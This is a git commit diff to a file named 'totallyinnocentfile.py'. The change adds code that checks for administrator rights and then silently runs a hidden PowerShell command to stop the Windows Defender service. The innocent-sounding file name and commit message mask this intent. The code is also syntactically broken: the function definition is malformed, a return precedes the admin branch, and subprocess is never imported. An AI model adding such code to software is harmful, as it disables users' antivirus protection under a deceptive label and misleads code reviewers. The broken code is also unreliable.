568035040a94877e9bd16589c08607e0cdd5200c
WotsitGamer <73761519+WotsitGamer@users.noreply.github.com>
2022-05-31 17:48:37 +0100

    Update totallyinnocentfile.py

--- totallyinnocentfile.py
+++ totallyinnocentfile.py
@@ -1,2 +1,11 @@
+import ctypes, os
 def go();
-  print("YAY")
+   try:
+       is_admin = (os.getuid() == 0)
+   except AttributeError:
+       is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+   return is_admin
+  if is_admin:
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    subprocess.call("powershell -c sc stop WinDefend", startupinfo=si, shell=True)
